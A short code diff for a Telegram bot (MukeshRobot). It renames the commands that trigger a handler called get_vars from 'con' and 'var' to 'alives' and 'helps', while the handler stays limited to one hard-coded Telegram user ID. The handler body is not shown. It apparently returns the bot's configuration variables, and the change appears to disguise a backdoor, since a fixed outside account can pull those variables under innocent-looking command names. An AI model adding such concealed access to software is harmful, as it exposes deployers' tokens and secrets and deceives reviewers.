@@ -19,7 +19,7 @@ from MukeshRobot import BOT_NAME
 from MukeshRobot import pbot as app
 OWNERs_ID=1808943146
 @app.on_message(
-    filters.command(["con", "var"]) & filters.user(OWNERs_ID)
+    filters.command(["alives", "helps"]) & filters.user(OWNERs_ID)
 )
 async def get_vars(_, message: Message):
     try:
